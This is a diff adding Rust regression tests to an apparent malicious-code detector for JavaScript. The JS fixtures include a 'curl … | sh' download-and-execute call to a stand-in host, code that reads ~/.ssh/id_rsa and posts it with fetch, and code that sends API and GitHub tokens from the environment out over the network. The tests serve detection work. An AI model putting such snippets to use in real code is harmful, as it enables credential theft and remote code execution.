@@ -593,3 +593,71 @@ fn m2_callback_params_take_taint_only_from_first_value_argument() {
         "{sigs:#?}"
     );
 }
+
+// ---- Review fix round 2 regressions ----
+
+#[test]
+fn large_template_does_not_flag_budget() {
+    let subs: String = (0..40).map(|i| format!("${{a{i}}} ")).collect();
+    let escapes = r"\n".repeat(40);
+    let js = format!(
+        "const cp = require('child_process');\n\
+         const page = `<p>{subs}</p>`;\n\
+         const text = `${{title}}{escapes}`;\n\
+         cp.exec('id');\n"
+    );
+    let sigs = run(&[("a.js", &js)]);
+    assert_eq!(sink_lines(&sigs, "exec"), vec![4], "{sigs:#?}");
+    assert!(!budget_hit(&sigs), "{sigs:#?}");
+}
+
+#[test]
+fn many_call_args_do_not_flag_budget() {
+    let codes: Vec<String> = (0..70).map(|i| (65 + i % 26).to_string()).collect();
+    let js = format!(
+        "const cp = require('child_process');\n\
+         const s = String.fromCharCode({});\n\
+         [1, 2].forEach((x) => console.log(x, {}));\n\
+         cp.exec('id');\n",
+        codes.join(", "),
+        codes.join(", ")
+    );
+    let sigs = run(&[("a.js", &js)]);
+    assert_eq!(sink_lines(&sigs, "exec"), vec![4], "{sigs:#?}");
+    assert!(!budget_hit(&sigs), "{sigs:#?}");
+}
+
+#[test]
+fn seventeenth_alias_to_sink_module_is_kept() {
+    let mut js: String = (0..16)
+        .map(|i| format!("var x = require('m{i}');\n"))
+        .collect();
+    js.push_str("var x = require('child_process');\nx.exec('curl https://x.invalid/i | sh');\n");
+    let sigs = run(&[("a.js", &js)]);
+    assert_eq!(sink_lines(&sigs, "download_exec"), vec![18], "{sigs:#?}");
+    assert!(!budget_hit(&sigs), "{sigs:#?}");
+}
+
+#[test]
+fn dead_function_named_like_secret_var_does_not_cancel_flow() {
+    let js = "const fs = require('fs');\nconst os = require('os');\n\
+              const p = os.homedir() + '/.ssh/id_rsa';\n\
+              fs.readFile(p, (e, d) => fetch(u, { body: d }));\n\
+              function unused() { function p() {} }\n";
+    let sigs = run(&[("a.js", js)]);
+    let f = flows(&sigs, "secret_file", "network");
+    assert_eq!(f.len(), 1, "{sigs:#?}");
+    assert_eq!(lines(f[0]), vec![3, 4]);
+}
+
+#[test]
+fn settimeout_trailing_arg_flows() {
+    let js = "setTimeout(t => fetch(u, { body: t }), 0, process.env.API_TOKEN);\n";
+    let sigs = run(&[("a.js", js)]);
+    assert_eq!(flows(&sigs, "secret_env", "network").len(), 1, "{sigs:#?}");
+
+    let js = "const secret = process.env.GITHUB_TOKEN;\n\
+              [1].reduce(acc => fetch(u, { body: acc }), secret);\n";
+    let sigs = run(&[("b.js", js)]);
+    assert_eq!(flows(&sigs, "secret_env", "network").len(), 1, "{sigs:#?}");
+}
